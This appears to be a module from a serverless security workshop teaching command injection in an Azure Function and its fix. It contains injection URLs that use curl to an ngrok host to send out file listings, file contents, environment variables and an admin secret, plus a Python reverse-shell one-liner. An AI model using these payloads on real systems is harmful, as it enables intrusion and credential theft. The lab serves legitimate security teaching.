# Input Validation


## Why we're doing this? Injection! 
One of the most common web and serverless attacks is Injection. Let's take a look at our application code and see if it could be vulnerable to injection?   


```python
#Truncated for reference
#Set the name variable from the query string
name = req.params.get('name')
#Use os.system to write the file using the name
os.system('echo "{}" >> /tmp/{}'.format(json_data,name))
```
You can see here that the `name` parameter is passed in as a command line argument using `os.system` this is bad practice and we should ideally use a library for writing to the file system. However this is seen regularly. 

A bad actor could pass a cli command in the `name` string as a query parameter and have that command run on the underlying system. Let's try that. 

## Exploiting the vulnerability 

In order to exploit this vulnerability, we need to pass in our command with the `name` parameter in the query string. Something like this:  

```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah ; echo "Hello" ; curl <NGROK_ID>.ngrok.io?data=$(ls /tmp | base64 --wrap=0)
```

This URL will send the output of `ls /tmp` to an `ngrok` (more on this in a minute) endpoint encoded as base64.

We would need to urlencode our command using a site such as [URL Encoder](https://www.urlencoder.org/).

**Set up ncat listener**   

`nc -l 3006`

**Run a local webserver**   

`python -m SimpleHTTPServer 80`  

**Set up ngrok forwarder** 

> ngrok is a tool that enables us to reach our locally running web server over the internet. 

`ngrok http 80`

**Ngrok Inspector**  
Open up a broswer to [http://127.0.0.1:4040/](http://127.0.0.1:4040/)

Let's see what kind of data we can get... 

**Lists out the files in /tmp**
```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%20<NGROK_DOMAIN>.ngrok.io?data=$(ls%20/tmp%20|%20base64%20--wrap=0)
```

**cat one of the files in /tmp**
```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%20<NGROK_DOMAIN>.ngrok.io?data=$(tail%20/tmp/Sarah%20|%20base64%20--wrap=0)
```

**Lists out the environment variables**
```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%20<NGROK_DOMAIN>.ngrok.io?data=$(env%20|%20base64%20--wrap=0)
```

**Gets value of ADMINSECRET**
```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%20<NGROK_DOMAIN>.ngrok.io?data=$(echo%20$ADMINSECRET%20|%20base64%20--wrap=0)
```

**Reverse Shell**  
We won't work through this now, but imagine how we could pop open a reverse shell to the underlying function host using a command like the one below. This would make extracting data and enumerating the file system very very easy.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.tcp.ngrok.io',<NGROK_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
```

You can hopefully see how dangerous this could be. Not only could function source code be collected, but we could leverage the `MSI_ENDPOINT` and 'MSI_SECRET' environment variables to obtain access tokens to Azure services. More on this in the secrets module.

### Challenge
See if you can extract the function code for this function app from the functions host. 

## Fixing the issue! 
There are three ways to fix this issue. 

1. In our function code
2. API Management Policies
3. Web Application Firewall (WAF)

In this module we're going to focus on fixing our **function code** to make it less vulnerable. Policies in APIM require some more advanced understanding of APIM that we unfortunately, don't have time to go into in this workshop. You can read more [here](https://docs.microsoft.com/en-us/azure/api-management/api-management-policies). 

We'll cover WAF in [module 7 - WAF](waf.md). 

We shouldn't really be adding files to the filesystem using `os.system` we should be using a library for this. Let's remove the following line

```python
os.system('echo "{}" >> /tmp/{}'.format(json_data,name))
```

and replace it with 

```python
f = open("/tmp/"+ name + ".txt", "w")
f.write(json_data)
f.close()
```

We should also validate the format of the data, in it's simplest form, we can use some Regex to make sure the `name` parameter consists of only letters.

Add an import statement to add the regex module at the top of our code

```python
import re
```

Add this code to the top of your python code below the line that begins the `if name:` statement.   

```python
if (re.match('^[_A-z0-9]*((-|\s)*[_A-z0-9])*$', name)):
    #Add logic to continue here
else:
    #throw exception
    return func.HttpResponse(
             "Invalid Name Format, no special characters allowed",
             status_code=400
    )
```

